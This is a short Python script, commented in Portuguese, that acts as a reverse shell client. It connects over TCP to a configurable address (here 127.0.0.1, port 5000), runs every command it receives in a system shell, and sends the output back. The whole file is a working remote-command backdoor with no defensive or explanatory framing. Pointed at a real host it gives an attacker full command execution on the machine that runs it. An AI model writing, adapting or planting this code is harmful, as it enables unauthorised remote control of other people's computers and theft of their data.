from socket import *
import subprocess

try:
    with socket(AF_INET, SOCK_STREAM) as server:  # Protocolos: IPV4 E TCP
        ipAndress = "127.0.0.1"  # IP que o servidor vai se conectar
        portAndress = 5000  # Porta sera utilizada

        # Me conectando no endereço que foi inserido
        server.connect((ipAndress, portAndress))

        while True:
            cmdRcv = server.recv(1024).decode()
            cmdExec = subprocess.Popen(cmdRcv, shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            cmdResponse = (cmdExec.stdout.read(), cmdExec.stderr.read())
            server.send(b"".join(cmdResponse))


except TimeoutError as err:
    print("Não foi possível conectar ao servidor:", err)
except ConnectionResetError as err:
    print("A conexão foi fechada inesperadamente:", err)
except Exception as err:
    print("Ocorreu um erro:", err)
